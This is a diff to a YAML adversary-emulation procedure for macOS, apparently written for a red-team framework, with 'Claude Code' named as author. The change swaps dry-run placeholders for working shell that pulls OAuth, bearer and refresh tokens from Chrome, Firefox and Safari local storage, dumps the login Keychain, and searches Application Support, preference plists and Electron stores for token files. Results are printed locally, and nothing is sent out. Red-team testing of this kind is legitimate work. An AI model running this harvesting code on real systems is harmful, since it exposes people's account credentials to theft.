@@ -5,7 +5,10 @@ name: OAuth Token Abuse
 authors:
 - Claude Code
 description: |
-  Abuse stolen or leaked OAuth tokens to gain macOS system access
+  Search for and extract OAuth tokens and bearer credentials stored on a macOS system.
+  Examines browser local storage SQLite databases for stored tokens, dumps the macOS
+  Keychain for OAuth and bearer token entries, and searches application data directories
+  for token files.
 mitre:
   tactics:
   - TA0001 Initial Access
@@ -14,52 +17,93 @@ mitre:
 requirements:
   platforms:
   - os: darwin
-args:
-- name: target_account
-  description: Target account for OAuth token abuse
-  type: string
-- name: password_list
-  description: Path to file containing potential OAuth tokens
-  type: string
-- name: leaked_creds_file
-  description: Path to file with leaked OAuth tokens
-  type: string
-- name: oauth_token
-  description: Stolen OAuth token to abuse
-  type: string
 steps:
-- name: load_oauth_tokens
-  description: Load stolen OAuth tokens
+- name: search_browser_local_storage
+  description: Search browser local storage SQLite databases for OAuth tokens
   inline: |
-    echo "Loading stolen OAuth tokens"
-    if [ -f "${leaked_creds_file}" ]; then
-      wc -l < "${leaked_creds_file}" | xargs echo "OAuth tokens loaded:"
+    echo "=== Searching Browser Local Storage for OAuth Tokens ==="
+    # Chrome Local Storage
+    chrome_ls="$HOME/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb"
+    if [ -d "$chrome_ls" ]; then
+      echo "--- Chrome Local Storage ---"
+      echo "LevelDB directory found: $chrome_ls"
+      find "$chrome_ls" -name "*.log" -o -name "*.ldb" 2>/dev/null | while read -r f; do
+        strings "$f" 2>/dev/null | grep -iE "oauth|bearer|access_token|refresh_token|id_token" | head -5 | while read -r match; do
+          echo "FINDING (Chrome): $match" | cut -c1-120
+        done
+      done
+    else
+      echo "Chrome Local Storage not found"
     fi
-- name: identify_token_scope
-  description: Identify scope and permissions of OAuth tokens
-  inline: |
-    echo "Analyzing OAuth token scopes"
-    # Dry run: simulate scope analysis
-    echo "Token scope identification in progress"
-- name: validate_token_freshness
-  description: Check if tokens are still valid and not revoked
-  inline: |
-    echo "Validating OAuth token freshness"
-    if [ -n "${oauth_token}" ]; then
-      # Dry run: simulate token validation
-      echo "Token validation check in progress"
+    # Firefox Local Storage
+    ff_profiles="$HOME/Library/Application Support/Firefox/Profiles"
+    if [ -d "$ff_profiles" ]; then
+      echo "--- Firefox Local Storage ---"
+      find "$ff_profiles" -name "webappsstore.sqlite" 2>/dev/null | while read -r db; do
+        echo "Found Firefox local storage: $db"
+        cp "$db" /tmp/ttp_ff_ls.db 2>/dev/null
+        sqlite3 /tmp/ttp_ff_ls.db "SELECT key, value FROM webappsstore2 WHERE key LIKE '%token%' OR key LIKE '%oauth%' OR value LIKE '%bearer%' LIMIT 20;" 2>/dev/null | while read -r row; do
+          echo "FINDING (Firefox): $row" | cut -c1-120
+        done
+        rm -f /tmp/ttp_ff_ls.db
+      done
+    else
+      echo "Firefox profiles not found"
     fi
-- name: abuse_oauth_access
-  description: Use OAuth tokens to gain unauthorized access
+    # Safari Local Storage
+    safari_ls="$HOME/Library/Safari/LocalStorage"
+    if [ -d "$safari_ls" ]; then
+      echo "--- Safari Local Storage ---"
+      find "$safari_ls" -name "*.localstorage" 2>/dev/null | while read -r db; do
+        echo "Found Safari local storage: $db"
+        sqlite3 "$db" "SELECT key, value FROM ItemTable WHERE key LIKE '%token%' OR key LIKE '%oauth%' LIMIT 10;" 2>/dev/null | while read -r row; do
+          echo "FINDING (Safari): $row" | cut -c1-120
+        done
+      done
+    fi
+- name: dump_keychain_oauth_tokens
+  description: Search the macOS Keychain for OAuth and bearer token entries
   inline: |
-    echo "Attempting to abuse OAuth tokens for access"
-    # Dry run: simulate OAuth token usage
-    echo "OAuth token abuse attempt in progress"
+    echo "=== Searching Keychain for OAuth Tokens ==="
+    echo "--- Dumping keychain entries matching oauth/token/bearer ---"
+    security dump-keychain login.keychain-db 2>&1 | grep -iB5 "oauth\|token\|bearer" | head -80 || echo "Could not dump keychain or no matching entries"
+    echo ""
+    echo "--- Searching for specific OAuth service entries ---"
+    oauth_services=("com.google.auth" "com.microsoft.identity" "com.apple.idms.appleid" "com.github.auth" "com.slack.oauth" "com.dropbox.auth")
+    for svc in "${oauth_services[@]}"; do
+      result=$(security find-generic-password -s "$svc" 2>&1)
+      if ! echo "$result" | grep -q "could not be found"; then
+        echo "FINDING: OAuth entry found for service: $svc"
+        echo "$result" | grep -E "svce|acct|type" | head -5
+      fi
+    done
+- name: search_application_token_files
+  description: Search application data directories for stored token files
+  inline: |
+    echo "=== Searching Application Data for Token Files ==="
+    echo "--- Application Support directories ---"
+    find "$HOME/Library/Application Support" -maxdepth 3 \( -name "*token*" -o -name "*oauth*" -o -name "*auth*" -o -name "*credential*" \) -type f 2>/dev/null | head -20 | while read -r f; do
+      echo "FINDING: Token file at $f"
+      file "$f" 2>/dev/null
+    done
+    echo "--- Preferences with tokens ---"
+    find "$HOME/Library/Preferences" -name "*.plist" -type f 2>/dev/null | while read -r plist; do
+      plutil -p "$plist" 2>/dev/null | grep -iE "oauth|token|bearer|refresh" | head -2 | while read -r line; do
+        echo "FINDING: Token in plist $plist: $line"
+      done
+    done
+    echo "--- Electron app storage ---"
+    find "$HOME/Library/Application Support" -path "*/Local Storage/leveldb/*.ldb" 2>/dev/null | head -10 | while read -r f; do
+      tokens_found=$(strings "$f" 2>/dev/null | grep -ciE "oauth|bearer|access_token" || true)
+      if [ "$tokens_found" -gt 0 ]; then
+        app_dir=$(echo "$f" | sed "s|$HOME/Library/Application Support/||" | cut -d'/' -f1)
+        echo "FINDING: $tokens_found potential tokens in app '$app_dir'"
+      fi
+    done
   cleanup:
     inline: |
-      echo "Revoking compromised OAuth tokens"
-
-      echo "Invalidating sessions from stolen tokens"
+      echo "Removing temporary database copies"
+      rm -f /tmp/ttp_ff_ls.db
 tests:
 - name: dry_run_test
   dry_run: true
